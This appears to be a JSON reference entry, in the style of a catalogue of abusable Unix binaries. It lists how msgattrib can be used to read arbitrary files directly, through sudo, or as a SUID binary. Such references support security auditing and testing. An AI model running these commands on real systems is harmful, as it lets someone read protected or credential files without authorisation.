{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nmsgattrib -P $LFILE\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
      }
    ]
  }
}
